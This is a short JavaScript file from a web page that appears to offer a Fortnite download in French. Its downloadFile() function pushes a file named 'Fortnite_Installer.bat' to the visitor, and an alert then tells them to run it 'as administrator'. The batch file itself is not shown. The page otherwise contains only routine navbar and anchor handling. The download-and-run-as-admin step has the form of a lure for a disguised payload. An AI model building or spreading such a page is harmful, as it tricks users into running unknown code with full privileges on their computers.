function downloadFile() {
    const link = document.createElement('a');
    link.href = 'Fortnite_Installer.bat';
    link.download = 'Fortnite_Installer.bat';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    setTimeout(() => {
        alert('Téléchargement lancé !\n\n1. Ouvre le fichier téléchargé\n2. Clic droit > "Exécuter en tant qu'administrateur"\n3. Attends la fin de l'installation (5-10 min)\n4. Profite de Fortnite !');
    }, 500);
}

document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
    });
});

window.addEventListener('scroll', () => {
    const navbar = document.querySelector('.navbar');
    if (window.scrollY > 50) {
        navbar.style.background = 'rgba(10, 14, 39, 0.98)';
    } else {
        navbar.style.background = 'rgba(10, 14, 39, 0.95)';
    }
});